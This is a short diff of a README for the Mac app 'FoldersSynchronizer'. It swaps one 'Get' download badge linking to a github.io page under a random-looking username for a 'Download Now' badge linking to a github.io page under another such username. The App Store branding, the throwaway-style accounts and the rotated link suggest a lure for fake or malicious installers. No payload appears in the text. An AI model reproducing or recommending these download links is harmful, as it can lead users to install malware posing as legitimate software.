@@ -4,11 +4,7 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/fb/87/d8/fb87d80d-5fe6-f8d8-5185-b91209d1ac11/Icon.png/1200x630wa.png" alt="FoldersSynchronizer Icon" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/foldersynchronizer">  
-<img src="https://img.shields.io/badge/Get_FoldersSynchronizer-darkblue?style=for-the-badge&logo=apple" alt="Get FoldersSynchronizer">  
-</a>  
-</div>  
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://hopeguzman087.github.io/.github/folders-synchronizer-automated)  
 
 ---
 
